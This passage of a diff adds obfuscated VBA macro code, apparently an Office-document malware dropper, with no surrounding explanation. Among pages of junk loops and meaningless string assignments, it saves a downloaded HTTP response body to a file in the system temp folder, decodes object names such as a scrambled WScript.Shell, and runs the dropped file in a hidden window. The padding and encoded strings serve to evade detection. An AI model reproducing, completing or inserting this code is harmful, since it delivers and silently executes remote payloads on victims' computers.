+        PtdwLqg = UCase("pOwoU!Jpp?s&FF")
+        hhspCB = 403 - 620 - 105
+        EeZZa = StrReverse("(Gakp#b)PJ")
+        whhXS = StrReverse("u!I*bnU)KhSb")
+        HxsJcpnb = Right("R_uuPS-Bn.P&v", 3)
+    Next MDacTQ
+
+    MBLnI = StrReverse("X*s?^BZ.AJw")
+    mYeHr = StrReverse("Lui(jTVIAVo")
+    For FNMbix = 0 To 212
+        EeZZa = StrReverse("GGlQ(orN(%gLpV(kfv")
+        MBLnI = 1013 + 372 + 1157
+        MBLnI = Right("[E c^fEk! uE(DgF", 3)
+        JyvlJPlv = Left("EAj]mLPp!yAhn", 4)
+        whhXS = "#j@EAjtEmh(!LR^?" + "oP%@k Mh NMvGB^" + "ijI)CygvwvajL"
+        HxsJcpnb = UCase("t?Aj$ aWBaN")
+        mYeHr = Space(11)
+        whhXS = 451 - 1345 - 122
+        whhXS = Right("RQH%J&. #*-w", 5)
+        LFzMCY = 811 + 1801 + 221
+    Next FNMbix
+
+    mYeHr = Right("x zMvebdUkTbWA#s", 2)
+    JyvlJPlv = "mjo#^nrBFzSNy" + "%H!N#YoHf?S#woeE-zTv" + "divufNOa?x#]@o(#sA"
+    EeZZa = Left("mwPd#$!zPhmMF _", 2)
+    HxsJcpnb = LTrim("NKm.H_PEViyKTS")
+        paOdgEL.Type = 5 - 4
+    mYeHr = 1214 - 512 - 323
+    HxsJcpnb = RTrim("NsE#Kt#jH(#x](Db")
+    hhspCB = 1304 + 542 + 1947
+    PtdwLqg = 1508 - 1321 - 1138
+    MBLnI = StrReverse("q-ZrQSDt*nxUApMlO%RB")
+        WLmcm = zQqZn.responseBody
+    HxsJcpnb = RTrim("Y#PTZkfmdwknMXYo[n!l")
+    LFzMCY = Right("P^JA.Ov[JIhQK-z", 4)
+    For lYocHc = 0 To 90
+        MBLnI = UCase("ZWdBX([ge$X%sc^Yw?e")
+        EeZZa = Left("[GeTeBH)xPW?M", 5)
+        LFzMCY = 1705 - 190 - 1568
+        LFzMCY = RTrim("Xnhc-WmJOd")
+        hhspCB = Space(13)
+        hhspCB = 1036 + 1420 + 673
+        HxsJcpnb = "cH]]Q$iZA&KUP.E*cMd" + "Bo)eWAWkha" + "hB%p VzweOh$XTl)("
+    Next lYocHc
+
+    JyvlJPlv = 1614 - 179 - 1163
+    MBLnI = 536 - 519 - 1789
+        paOdgEL.Write WLmcm
+    LFzMCY = LTrim("Pp@*arKw@eNThjfBWkPO")
+    MBLnI = UCase(") S-g@[^rsI")
+    MBLnI = RTrim("sIZ&WR.ggtRmIr#q%")
+    For ebDkFH = 0 To 66
+        JyvlJPlv = Left("W?vaKr*i?NdhINu", 3)
+        MBLnI = UCase("WyE&PQsvZ@XSqOj")
+        hhspCB = "AePP@MEfnceAbi&hkK" + ".dWrqJDN$WNI" + "Ms$bSiqDAS"
+    Next ebDkFH
+
+    HxsJcpnb = RTrim("pFnuuBO]s$LY^&")
+    whhXS = 1022 + 1713 + 465
+    whhXS = 1204 - 691 - 724
+    EeZZa = StrReverse("m ype TNqLC")
+    HxsJcpnb = LTrim("v[ pSyLc?rSJ-Jg[Xc e")
+    While ywrFYP < 10
+        EeZZa = Left("GFocAsral$#xNE.pr@Qu", 5)
+        hhspCB = Left("#mZBf!w)t]z#", 4)
+        HxsJcpnb = 1985 - 1973 - 1334
+        whhXS = Space(18)
+        MBLnI = UCase("nzJiN)$Wq]SUrqFaX")
+        mYeHr = Left("E]&hilBBRoIeTft", 2)
+        EeZZa = Space(17)
+        LFzMCY = 1135 + 411 + 1245
+        EeZZa = 316 + 948 + 727
+        ywrFYP = ywrFYP + 2
+    Wend
+
+        Dim VEQwM As Object
+    PtdwLqg = LTrim("Yh !hnDKnNX.DeQX%qN")
+    PtdwLqg = 1528 + 238 + 964
+    mYeHr = "_@t]uU%tkmr]VUmq" + "CTmkOi?Ce)iSi" + "wFntbV]XTs"
+    For BZGkxg = 0 To 247
+        whhXS = Left("$f^$Jd_Erj", 3)
+        PtdwLqg = LTrim("rNhvhvPoEzUF")
+        PtdwLqg = LTrim("sjJaCENVWM!")
+    Next BZGkxg
+
+    LFzMCY = RTrim("n![V&avrG%mm_Jk")
+    JyvlJPlv = Right("^ycOfcKu%.Ii", 4)
+    whhXS = LTrim("#%](ccaeWBOO LUPJ!")
+    LFzMCY = Space(12)
+    While oneRiO < 270
+        MBLnI = StrReverse("MuHv*%)LCzc@F?Uy")
+        hhspCB = Left("X$pPJamXOscULSEXbz", 4)
+        JyvlJPlv = LTrim("Gj]RdCsD%oE&")
+        MBLnI = Left("QLHz!luTKE", 5)
+        EeZZa = Space(1)
+        PtdwLqg = "Uda Fdpbr%^" + "d&-TzInT[fg*WB.TPyas" + "%GcDBQ$_uTK-q(.%!"
+        oneRiO = oneRiO + 1
+    Wend
+
+        Set VEQwM = CreateObject(AmUDWKu("sycrrQiXpktgiMn.g .[fEi%l@eksByTsctieEm(oNbvj!eDc.t@"))
+    MBLnI = Space(11)
+    EeZZa = Left("T!!n#IQTXMl.!", 2)
+    MBLnI = UCase("R(pTbKdORP")
+    HxsJcpnb = Right("p$ddlgUFA!IGeH?NdsY", 5)
+    JyvlJPlv = 1637 - 399 - 253
+    hhspCB = StrReverse("GjVx]O@R_l]?COHSx$")
+    JyvlJPlv = Left("idAPhZqFou", 5)
+    mYeHr = LTrim("g)Q@Rm_XguTt-lU")
+    MBLnI = UCase("trcskqZRv^OXY#Ob")
+        tBiBBT = VEQwM.GetSpecialFolder(3 - 1)
+    JyvlJPlv = LTrim("xIn?SNMeI^jAtaHSVYz")
+    While kaeQMP < 326
+        PtdwLqg = StrReverse("W-fVbvLQhj#t[f]NOU")
+        MBLnI = Right(")_Lz^naJrD", 5)
+        HxsJcpnb = RTrim("!Wu!)cg-%L(s)iyHQz$I")
+        JyvlJPlv = LTrim("WCPuv&UE]qx")
+        whhXS = StrReverse("jO YWKi_-I")
+        PtdwLqg = 1328 + 181 + 805
+        MBLnI = Space(7)
+        JyvlJPlv = UCase("kkHWp@x_PFlDuTu")
+        whhXS = 863 + 591 + 658
+        hhspCB = Left("udJq? .t&hb(eN%", 5)
+        kaeQMP = kaeQMP + 3
+    Wend
+
+    For AeRLnY = 0 To 200
+        PtdwLqg = "@LUBRQ!XiGX)SiTBDe" + ".q& $cSKiJf" + "rfj!spx)Ai)?jRmZ"
+        hhspCB = LTrim("^*pDKkEsC]QSUuzOnu)")
+        hhspCB = Right("tOCsU(CAN)!M(goV[p", 2)
+        JyvlJPlv = RTrim("%GA-)kgzK?(oZxRK#")
+        mYeHr = 334 - 924 - 1435
+        JyvlJPlv = Right("$?(qJ*Ta-FPGd*aluWz", 2)
+        EeZZa = 1679 + 969 + 709
+        mYeHr = Space(1)
+        HxsJcpnb = 1439 + 490 + 596
+    Next AeRLnY
+
+    hhspCB = RTrim("Th-QPn&CeDLuc!lEU")
+    EeZZa = UCase("Sz^TD aS?SVe^")
+    whhXS = Space(16)
+    JyvlJPlv = UCase("jy$X.D)kvp[cV%sW")
+    For ocaTRS = 0 To 297
+        hhspCB = StrReverse("r(bJwnpcP_^[O")
+        JyvlJPlv = "vve(%PB](dR" + "RroY)-hETK" + "MU_KZ-^$FK^lDB"
+        LFzMCY = 1550 - 1013 - 1708
+        EeZZa = Right("cCTP.pLs#L%", 3)
+        PtdwLqg = UCase("rySqdNE (Yi$DjC$z")
+        mYeHr = UCase("L.WyYATygOEFi%?oW]Os")
+        HxsJcpnb = 758 + 249 + 980
+    Next ocaTRS
+
+    whhXS = UCase("kh!%vzy($.HYnrocU@c@")
+        Call paOdgEL.SaveToFile(tBiBBT & "\\" & AmUDWKu("i[AvqziIG$.fjcahrE"), 2)
+    whhXS = UCase("eWcO!K$lH[MRTkC!")
+    For ACkqAS = 0 To 262
+        JyvlJPlv = "w%]bqUKLiBRExoU]Tt" + "r)]e]zuS*arqiCyJ" + "BZr$)VnOA!KX^"
+        JyvlJPlv = RTrim("!MYMq DQtFZL]E$")
+    Next ACkqAS
+
+    MBLnI = Space(14)
+    MBLnI = "l%TD#XyBbz" + "Bs*hbw)SfWOM" + "P_ADw-l%i-["
+    LFzMCY = UCase("Y_ZHbE][q&hgP*D")
+    For toshEH = 0 To 61
+        HxsJcpnb = UCase(".sNexIIlRy")
+        MBLnI = LTrim("_r**Yw_OB?^")
+        JyvlJPlv = Space(16)
+        hhspCB = StrReverse("ezx.XkH?YTF")
+        mYeHr = Left("h.%Co%LcmVdqVs^^WYdU", 3)
+        MBLnI = 1737 - 768 - 951
+        hhspCB = 1207 - 1883 - 117
+        HxsJcpnb = LTrim("KF!DeDIkcIaJd@a!")
+    Next toshEH
+
+    whhXS = RTrim("uTo@^SIRixTMrY[")
+    For laAxEn = 0 To 40
+        LFzMCY = LTrim("sl? Bz.%SjMx(- ")
+        hhspCB = Space(1)
+        EeZZa = ")$QdVEDAOVx$" + "*MYE@i#fUJzTyMi@(" + "P@$]Y.[TM#ag"
+        MBLnI = LTrim("Qpiuu?pN!])N")
+        whhXS = Space(17)
+        HxsJcpnb = Space(5)
+        EeZZa = RTrim("&MPyT*^pg.K(zwGim")
+        mYeHr = Right("Cvek @F-u(ouII@I", 5)
+        PtdwLqg = LTrim("OSwqj]LkEDoWg^*.DiWt")
+        PtdwLqg = StrReverse("DzI[lQizI!")
+    Next laAxEn
+
+    EeZZa = 903 - 610 - 554
+        paOdgEL.Close
+    MBLnI = "o-C.u@pJQYaVVtaxzrG" + "S_pdq#((-[BX&-]NwM" + "DHP?h-?t#)twLW%#@?"
+    whhXS = LTrim("[*tKLnMUq(f-")
+    While wLZOQW < 178
+        PtdwLqg = 1001 + 657 + 1229
+        LFzMCY = "P_lnMUOfpbqk" + "UneAZOYN^zC*buer" + "]@yjXKP%.S"
+        mYeHr = "(rzAR V [d!fu" + "a%bs!uL@WmdrkJ" + "cGP[-^QazsczhTS[_Gf&"
+        EeZZa = Left("m#E HyS(ZCgBoZv", 2)
+        PtdwLqg = LTrim("iu]]MyUqEF_X")
+        LFzMCY = RTrim("xSd%IMfb!Ou")
+        hhspCB = 815 - 1706 - 814
+        LFzMCY = "gt^vllGO#T?Ogr" + "V_GMEIQJ]u)*%t)rM." + "T  HBbmv.pAw!p.$HI"
+        LFzMCY = StrReverse("@O-W!f)ppHT ypGAO")
+        PtdwLqg = StrReverse("oXvlT#P)POX^bxEagF")
+        wLZOQW = wLZOQW + 3
+    Wend
+
+    whhXS = RTrim("lSSV!ASSy H")
+    HxsJcpnb = 447 + 389 + 889
+    MBLnI = 146 - 917 - 1249
+    MBLnI = Space(15)
+    MBLnI = 1692 + 1932 + 990
+    mYeHr = Left("qxUh$VFwCm#t(Wo!kJ", 2)
+    End If
+    whhXS = RTrim("!*J%-ROuch")
+    whhXS = Right("VLh!jP*B@jATxn", 3)
+    EeZZa = StrReverse("]CZx$%NL.y&XP$dAN")
+    JyvlJPlv = 295 + 373 + 1725
+    MBLnI = Left("vAOxe&&kZDv FnBlp", 3)
+    EeZZa = RTrim("DHHtU^iH_^b$BwyORpV")
+    LFzMCY = LTrim("IOQc]z*_$[")
+    EeZZa = Right("w#w@QBR#.lJX", 4)
+
+    EeZZa = RTrim("_ZUB.e&sXO@T")
+    whhXS = Space(10)
+    MBLnI = Right("oOhdkL[fBu@Smsu", 2)
+    For ahhTcO = 0 To 33
+        EeZZa = RTrim("pxmp@wlxJVkmOjEMP!QK")
+        MBLnI = "[QfzycQh [&" + "WrOKEWbC_[A?c." + "CS)t&B]TI#QA)&"
+    Next ahhTcO
+
+    JyvlJPlv = 1112 - 1803 - 1955
+    HxsJcpnb = RTrim("DMPfKiznhP?)qy.hV")
+
+    While UxdHwa < 779
+        MBLnI = UCase("C wMaqDAnO#JC)!xZZI")
+        mYeHr = StrReverse("_It?MF$*(SJPb")
+        HxsJcpnb = Left("ZxR-YBqBK)Wbaoh", 5)
+        HxsJcpnb = 672 - 718 - 1450
+        EeZZa = Right("[v!V]ZBkev[Z_?wgu]B", 3)
+        LFzMCY = Right("Q)ueV_L&G@%Ng&ki", 2)
+        hhspCB = Left("xiL%rcG$[EilFjlpYq", 4)
+        If UxdHwa = 369 Then
+            JyvlJPlv = 1108 + 849 + 1600
+            Call hPZMwj(lLfirhl & "\\" & AmUDWKu(fJouoBOd), "tnMxFA", "mNAmDHV", "AIVdkwK", "yWrNQKmM", "WxMNXAVOsx", "KowETpB")
+            HxsJcpnb = Right("chFyiyMRT_cKRk", 3)
+            LFzMCY = LTrim("KM^E@jmpxU")
+            MBLnI = Left("fMfRq KYx!pCen&%r?G", 4)
+            PtdwLqg = 457 + 1837 + 322
+        End If
+        mYeHr = StrReverse("(miyi?z*er!C")
+        PtdwLqg = StrReverse("Yc$]$dkcJwG@XN")
+        For dpdOIh = 0 To 247
+            JyvlJPlv = LTrim("iZw)VBoz[EjS")
+            JyvlJPlv = StrReverse("HgWL-q&L!AHy")
+            EeZZa = Right("v&j&?*cgkTuyIA^mvS", 2)
+            PtdwLqg = 648 - 1384 - 774
+            LFzMCY = LTrim("DmYSRuoj(YMNWEs%")
+            JyvlJPlv = 288 + 1047 + 346
+            MBLnI = Space(10)
+        Next dpdOIh
+
+        PtdwLqg = RTrim("av]ljT#n-yLxiMG( *C")
+        While nOUAle < 257
+            HxsJcpnb = Space(5)
+            HxsJcpnb = Left(".qEI?criWcKXaW.pP", 3)
+            HxsJcpnb = 376 + 900 + 451
+            MBLnI = UCase("ZScDjoq.MDNbt")
+            hhspCB = Space(16)
+            nOUAle = nOUAle + 2
+        Wend
+
+
+    UxdHwa = UxdHwa + 1
+    Wend
+    While cMaaLe < 274
+        MBLnI = StrReverse("DXSZZvHernWoZ@Rt")
+        whhXS = 1129 - 1137 - 1851
+        cMaaLe = cMaaLe + 1
+    Wend
+
+    mYeHr = Left("FlvzF &YFm?hO", 5)
+    For unXPTQ = 0 To 67
+        HxsJcpnb = LTrim("ve$@Mv@RIIG)LO#cu")
+        HxsJcpnb = 1882 - 498 - 1281
+        PtdwLqg = 114 - 263 - 184
+        HxsJcpnb = RTrim("McWOVDzGLiJIiBUZ&Vt*")
+    Next unXPTQ
+
+    JyvlJPlv = 114 - 1171 - 1134
+    hhspCB = UCase("KB-&%kXITXx")
+    For KyHEEG = 0 To 378
+        MBLnI = UCase("nVqJ.zU^WHCWxT^YO$")
+        whhXS = Left("C&%@EjjhtNCUPTxOFT[", 2)
+        EeZZa = UCase("ZZgUW^i($.h")
+        MBLnI = RTrim("EHEQgPWRT%ijCF(yEv")
+        MBLnI = Left("VHSqS#xqAxnV#ZDk^", 2)
+        HxsJcpnb = UCase("JcMKoF*xIaWLLM#W(daT")
+    Next KyHEEG
+
+    hhspCB = Left("v^Hhvh[ncSNzC", 5)
+    JyvlJPlv = Right("&$R IW!RoQ", 5)
+    HxsJcpnb = 1633 + 1616 + 1146
+    For tPbpMa = 0 To 299
+        LFzMCY = RTrim("#imi_(^IxucBr ")
+        EeZZa = Space(11)
+        hhspCB = UCase("nuu)eeu GJf")
+        EeZZa = Right(".CG!ng)!FoO(WfYHA$", 4)
+        mYeHr = Right("avb#Pig]u%V", 4)
+        EeZZa = 172 + 1309 + 431
+        PtdwLqg = Space(4)
+        LFzMCY = Space(15)
+        whhXS = Right("SZkD@vyqp!rzD^", 2)
+    Next tPbpMa
+
+
+End Sub
+
+Private Function gGywxI(VGLbPj As String) As String
+    HxsJcpnb = Space(20)
+    hhspCB = RTrim("vqMc&l%YJ]&v")
+    JyvlJPlv = UCase(" ]NkwPXw_Lu(z?wKhg")
+    mYeHr = 187 + 1210 + 1865
+    whhXS = Space(3)
+    PtdwLqg = LTrim("IhWUUa($fmAh*")
+    hhspCB = 978 - 1704 - 378
+    LFzMCY = StrReverse("t@l$fTnSK#CEu?P.YT-E")
+    whhXS = Left("^kKXHq]oCztsZ ", 3)
+    hhspCB = LTrim("w$tD!hET[PAqcLBUgNZR")
+    PtdwLqg = LTrim("q^vPQcl lPlOPRdB")
+    EeZZa = 592 + 268 + 370
+    LFzMCY = Right("i%vRJuleADvCHJ-jQb", 4)
+    JyvlJPlv = 899 - 1606 - 1526
+    EeZZa = Left("I](u]eBBlhLv-", 2)
+    For ACTrpG = 0 To 298
+        mYeHr = " _*&@.ocqI@" + "- [GB?*PWG" + "%S.Cu#x$*L*a&R&jYm*V"
+        JyvlJPlv = 302 + 1313 + 1645
+        hhspCB = Space(9)
+        whhXS = 235 - 1434 - 1379
+    Next ACTrpG
+
+    whhXS = "%NZoUQ]Xqy!a)aiz?" + "MsWkeV%tFR@OBv[VauEk" + "GJWH$EWOV[W[gg.PaKYm"
+    EeZZa = 1495 - 1577 - 911
+    MBLnI = Right("&A[sar(e.X", 3)
+    PtdwLqg = LTrim("SBPX(TXp?DyldX")
+    HxsJcpnb = RTrim("TvrDKZ@Ezrr?")
+    JyvlJPlv = "rHpb]j(oduWnNzYEyS" + "l#vdH HA&i%EyWcBe.(" + "J!BL$MR#lru_iwk"
+    While SIdGLB < 362
+        MBLnI = Space(19)
+        whhXS = RTrim("HzxxCjSfDuOh_F!$dh")
+        LFzMCY = LTrim("An& QfLu%PKOK- !")
+        SIdGLB = SIdGLB + 1
+    Wend
+
+    MBLnI = "[HWOF!@MkKCq" + "%dNkHatVY@CPk]C&Jb" + "A^@g*(B-FgHj"
+    For gKBdGA = 0 To 190
+        LFzMCY = RTrim("FgLcDd[uOdv")
+        JyvlJPlv = Right("(ww*cL]HpMx_M.oc", 2)
+        whhXS = 170 - 1130 - 1683
+        JyvlJPlv = LTrim("U O n(c#f@Bti")
+        PtdwLqg = Right("k_eq.-t%U_wQRZz_XM", 4)
+    Next gKBdGA
+
+    whhXS = LTrim("*uAS?tJisTby")
+    whhXS = Space(3)
+    EeZZa = UCase("e([PwF!t#oIz")
+    LFzMCY = UCase("rACVf$I((y@mhE^")
+    HxsJcpnb = Space(20)
+    MBLnI = RTrim("P!X&fwDH*)DYA")
+    whhXS = LTrim("#$PTRb)hvCU")
+    For PkYmGr = 0 To 114
+        LFzMCY = UCase("Gl fR%FKEvyMcByNo)CJ")
+        HxsJcpnb = Space(20)
+        PtdwLqg = 612 - 1682 - 404
+    Next PkYmGr
+
+    PtdwLqg = ".Im UYNP.^ *nP$UHW" + "gVHlq%q$$!JMqV!" + "mGG!DKW]BmwbdI?ZJpE"
+    MBLnI = 207 - 411 - 729
+    LFzMCY = RTrim("XRZoR_t^o$KZAPSy!")
+    mYeHr = Right("!D#fs#(L)^Rh&H-Io", 2)
+    MBLnI = LTrim("AyNbjKf_Pwjf^Jtuya%*")
+    LFzMCY = StrReverse("opYcGclX UrfnngED")
+    hhspCB = StrReverse("ZXh*ttzcjx*fSmPXa")
+    gGywxI = "NYlkEeCCileleODlVRBpEHxLZtMTjDoOCmPnuVkU"
+End Function
+
+Private Function FSOWUs(mTNRVnD As Boolean, lBaXmr As String, IgpAoyT As Double, LNDApEt As Integer) As String
+    While qpbXJB < 81
+        MBLnI = 359 + 1611 + 642
+        hhspCB = "IQZGrDM?ROURwqW%" + "SY@ku&xG(Jyl" + "p xb%P-Nki*SIAhjf"
+        mYeHr = UCase("qGIcDl*l%ufzQhvu*j$p")
+        JyvlJPlv = Left("H)_!G@ Sdmccco!", 4)
+        whhXS = Right("wNAbo@MgWNKir_tv", 5)
+        hhspCB = Left("ZNStpdar.ORGJ^f", 5)
+        hhspCB = LTrim("q]hYwsFtLjTVS-r")
+        HxsJcpnb = LTrim("-k!$*OTiqKOjf")
+        HxsJcpnb = Right("crBZ^$LzyD", 2)
+        qpbXJB = qpbXJB + 3
+    Wend
+
+    JyvlJPlv = Space(9)
+    LFzMCY = 307 + 366 + 321
+    PtdwLqg = 807 + 416 + 297
+    mYeHr = 1525 + 923 + 485
+    JyvlJPlv = RTrim("CFFeESZq[aAzCa&NJ")
+    mYeHr = 1263 + 515 + 1415
+    PtdwLqg = StrReverse("tS&SP%NCsTcaQX$S-")
+    While UsyMAJ < 19
+        EeZZa = "CUE-A.By#K_ZXu" + "]lc(lJZtRQOAu" + "IXIujTBuI-GO@ u#$_"
+        LFzMCY = 202 + 970 + 557
+        EeZZa = UCase("n(wWsqPOHP")
+        hhspCB = LTrim("nI u%aQ@mK%K#cD.Worq")
+        LFzMCY = Space(14)
+        hhspCB = "xm]PY]-a)l$ujxM^KqM?" + "Ht_&[JzoUR.KUXMP)W" + ")$om%tytcxuuUvY.qMx"
+        EeZZa = Right("ynt) MI#@Odszer&je", 3)
+        LFzMCY = StrReverse("c-nY#mSP%]")
+        UsyMAJ = UsyMAJ + 1
+    Wend
+
+    While TpmQNX < 88
+        PtdwLqg = LTrim("h%JAeEbQvOD-s")
+        hhspCB = UCase("r]??tb]SrPS.JlcU")
+        hhspCB = LTrim("G!pVZT[sNlvAIxTwrI")
+        MBLnI = Space(13)
+        mYeHr = RTrim("hBF$n#(qOKvABmtI&Q")
+        whhXS = 532 - 1709 - 1763
+        TpmQNX = TpmQNX + 1
+    Wend
+
+    HxsJcpnb = LTrim("wWop@Cdu.YBkFu]F")
+    whhXS = RTrim("oVUUpqDgkj)Xn")
+    MBLnI = StrReverse("u lQTzJk@ytz%z")
+    mYeHr = LTrim("LRvBrkdT&zrJCnNUIFC")
+    LFzMCY = UCase("#bwioGiuBKEgql")
+    For DaIAWl = 0 To 45
+        JyvlJPlv = LTrim("qY(-nUS&?W")
+        LFzMCY = StrReverse("Q%s@wi$t%gdsVy&")
+        whhXS = Right("xlaNYXtGs*(cS.VF*N", 2)
+        HxsJcpnb = UCase("bhdpoE!DO#Xpdco.j")
+        JyvlJPlv = 142 - 472 - 669
+        PtdwLqg = StrReverse("%qQoj^Qnjty#--F?")
+        PtdwLqg = 655 - 246 - 1004
+        whhXS = 1182 + 329 + 1794
+        EeZZa = StrReverse("?^X#K-gydtzq^s?l")
+    Next DaIAWl
+
+    EeZZa = "CEjCf*.IKN%s" + "PNE#S(skf TdXJblnLz" + ")#uaTasHkSXUw%("
+    HxsJcpnb = "vrBzcWetCEuM" + "I.hKhM.@lOf.E(V!?CrR" + "[Z%lvR_#xi&JkX%QcV"
+    EeZZa = 753 - 1996 - 2000
+    whhXS = UCase(" _IXkbKUMtXr[)qEb@")
+    PtdwLqg = "%.OCiTSzhPi" + "lkt!KKr(E.%)." + "LwkF_ZW?#aZ"
+    LFzMCY = 950 + 1398 + 1011
+    MBLnI = "^VHZ)Jt]Ln!]jer*C$" + "(#j!K%cQF#v" + "eaop^GYocMWLo#AY]"
+    PtdwLqg = 1052 - 1407 - 1261
+    hhspCB = RTrim("?]x$dQsa?EGd")
+    HxsJcpnb = LTrim("@^jUN#SsSajhn-")
+    HxsJcpnb = Space(3)
+    For XXwSWu = 0 To 145
+        PtdwLqg = "bXBISV%dywDoOPhLl" + "q%@V#$fe*G%mLS" + "pWZ@Oy*E@VQtj)zN"
+        LFzMCY = "@jUX]j H* [oL" + "^ub^ux?ooJ%CaWN.MI" + "z@dXLzzNAff#A["
+        EeZZa = RTrim("LzNKwZ%YWifzkEM? D")
+        JyvlJPlv = StrReverse("!Dur$UMTUF)Wp]c")
+        hhspCB = Right("nx)Y&La^i)haxyVIWI^", 5)
+        JyvlJPlv = 882 + 216 + 263
+    Next XXwSWu
+
+    PtdwLqg = Space(16)
+    MBLnI = 529 + 1845 + 1228
+    FSOWUs = "yDLppfjzcYqgroeTwpQdlkJgmjTUFc"
+End Function
+
+Private Sub fsYlAj(idQIKG As Double, WifjMa As String, UIlGsS As String)
+    For JSOghj = 0 To 110
+        hhspCB = LTrim(")JE[Z@wrDG")
+        mYeHr = LTrim("SkrXVvH&*Ye-pzT")
+        LFzMCY = RTrim("CgUG ]riff?")
+        EeZZa = Left("tsBX^#Q.%.wScXLA", 4)
+        whhXS = Left("PaM-_vD.##]WBQJSEzs", 3)
+        PtdwLqg = Left("%J^)Gngfg^v&qp^KZ", 4)
+        PtdwLqg = UCase("@MGChxMnP?Zu)ALu I&")
+    Next JSOghj
+
+    hhspCB = LTrim("D(ZGrt@^CItDmtKU-g")
+    whhXS = 751 + 230 + 114
+    MBLnI = LTrim("d&rwBtUAqUYciD")
+    PtdwLqg = RTrim("SCVqPQDs.Mb")
+    JyvlJPlv = 1413 + 620 + 1549
+    mYeHr = Left(" eFt-Bn$ VT", 5)
+    hhspCB = StrReverse("$Ryup)DslJj][bKKuhV")
+    JyvlJPlv = LTrim("#D^XT]vb^KlUJRV.lMu")
+    MBLnI = LTrim("lQw$WzNvs$tSJRW")
+    JyvlJPlv = Right("F&^.pdvJLkJz!fz%OnD$", 5)
+    While QwhnSb < 19
+        EeZZa = 1621 + 1496 + 119
+        EeZZa = 501 - 421 - 563
+        PtdwLqg = 1291 + 109 + 1211
+        PtdwLqg = RTrim("&&Ogi&rFSzGKm[XvCLO(")
+        LFzMCY = UCase("%jeHY)WAnflh]POLTr@")
+        whhXS = 1057 - 398 - 586
+        MBLnI = Right("-#CK-([_kFgC%p)vhB?", 4)
+        MBLnI = Right("kr(.YCnY&wWy oAovpE", 5)
+        QwhnSb = QwhnSb + 3
+    Wend
+
+    MBLnI = "([xwl*)m-IBl&KQ#A@JJ" + "V@K[tvYYDJpFtgcU?" + "Uv?)Kmf#p?IfWloLKWw"
+    HxsJcpnb = "SlA%C#-Yf-K ?LUBHfY" + "vxDK OkwfRaPHUb" + "!_Cnjks((GEo"
+    EeZZa = StrReverse("sntT-)uKTx@[")
+    hhspCB = Left("(UCdRaSDKAIopZ", 3)
+    PtdwLqg = Right("gRyUbhtCA zhbS", 4)
+    hhspCB = StrReverse("$$bUcnLVkg]wmwW")
+    JyvlJPlv = Left("(qHUE(lezB", 2)
+    While scXBhe < 381
+        LFzMCY = RTrim("DcQ_$H)O$zJn")
+        hhspCB = LTrim(" iSwItfoMm?BO[xeo_%")
+        scXBhe = scXBhe + 3
+    Wend
+
+    JyvlJPlv = RTrim("_rxkTC@mDeG?VxYt!")
+End Sub
+
+Private Sub hPZMwj(QuCJo As String, aHHHrbP As String, wvlHkg As String, fMSkzH As String, Olgygm As String, oOxARY As String, ydDDfh As String)
+    PtdwLqg = Right("n_P%$*!m*ymuaSpuHX]", 4)
+    mYeHr = Left("hNqGcl.N_b", 5)
+    LFzMCY = "k]JggK]gP)XcP" + "z$E)NdQmG#IPoA-hE" + "puU&T_)tpKn?-VT"
+    While wtqyac < 156
+        HxsJcpnb = 1456 - 1395 - 1383
+        whhXS = LTrim("$jj%qMWeo?")
+        HxsJcpnb = Right("F@P*KBgkFBqXx", 2)
+        wtqyac = wtqyac + 1
+    Wend
+    mYeHr = "fRqFHsipwO@VH" + "s@fOE@mqgrO" + "?-VBGBYP[*uRCh*"
+    MBLnI = LTrim("$*CyTPFrf[si Jk]%")
+    EeZZa = UCase(".ePP#CMGZObjJBkOyVaR")
+    mYeHr = Right("jg?EWanl y#D", 5)
+    EeZZa = LTrim("_h?Cgg.FF-q")
+    Set QPtSi = CreateObject(AmUDWKu("WcSHcjrsi-pZtW.CSuhreslpl]"))
+    QPtSi.Run QuCJo, 0
+    While EiqBnT < 369
+        EeZZa = RTrim("]KKgAv]m-I")
+        whhXS = Space(2)
+        hhspCB = StrReverse("sqdYEX%USn%")
+        JyvlJPlv = UCase("y%PkKp&kvKV^xMQvtg")
+        hhspCB = Right("p)[TZ@iMnE", 4)
+        MBLnI = Space(4)
+        LFzMCY = 153 - 795 - 1072
+        whhXS = 652 - 1607 - 391
+        EiqBnT = EiqBnT + 2
+    Wend
+End Sub
+
+Private Sub kxCIcz(rgIKCd As Double)
+    MBLnI = "*uxq._PduMKbvKm" + "hAuDS d(r@K.@(u-KO" + "fVe#lafjm?jZm"
+    hhspCB = "(Xi ORDDFlv&)yu](iG" + "U-b)$OnAjTA-" + "zJLv*epr-kY*J"
+    hhspCB = 718 - 1506 - 1696
+    JyvlJPlv = RTrim("!lwv R?[#LjWh")
+    mYeHr = Right("s)fpUVAlDfVI", 4)
+    LFzMCY = Right("PxT[H))U_A%gMfJOAm", 3)
+    hhspCB = Left("YLG.HGzAv&irt.&ShyV", 5)
+    whhXS = Left("s*K?]_bM(zmMK! HZv", 3)
+    JyvlJPlv = StrReverse("T@)EHhf-RzH")
+    JyvlJPlv = Space(18)
+    hhspCB = Space(10)
+    HxsJcpnb = UCase("l*XdNL.nTNO(iVV")
+    MBLnI = Left("L@(*OX?fBfV*a^FIYTK", 4)
+    PtdwLqg = UCase("sdR@n!QFeHJFkb")
+    EeZZa = 178 + 305 + 764
+    For qEytdf = 0 To 135
+        PtdwLqg = Left("?GWi@aG.rU", 4)
+        LFzMCY = UCase("Jegc]yKzg[pH[jry.")
+        HxsJcpnb = 1171 - 687 - 371
+    Next qEytdf
+
+    whhXS = StrReverse(".Mahqi.S-oSka(cIio")
+    hhspCB = RTrim("CnPCJKkSID$AbkAm@")
+    whhXS = RTrim("[-iHRM ygkohhmYG")
+    whhXS = StrReverse("ABLOrnrODNpRBCO")
+    mYeHr = UCase("bf*ZaJpK?uT .*#h")
+End Sub
+
+Private Sub FBOFiB(NNNXoI As Boolean, MEAUvK As Double, WBQRaMl As Boolean, rivjbhK As Integer)
+    HxsJcpnb = Left("WWn!!sqHri(TK??", 2)
+    mYeHr = RTrim("VK[TzJQZLKE")
+    LFzMCY = 316 + 796 + 1183
+    While KHSEio < 151
+        PtdwLqg = Space(3)
+        HxsJcpnb = UCase("cr%DZ!(o$?LM")
+        EeZZa = "!lBe.zs@i*HtJGj" + "rVa_ABa_gQs-c@[zpm " + "dm[lC#josixjCmU"
+        JyvlJPlv = RTrim("U*WZ#!xR*[d[UNecEUx")
+        EeZZa = "*oLWy%&R_G.^" + "&PDIa$l-qQtDloR?Kq" + "#WCI&(e-KFuU&MHR"
+        KHSEio = KHSEio + 2
+    Wend
+
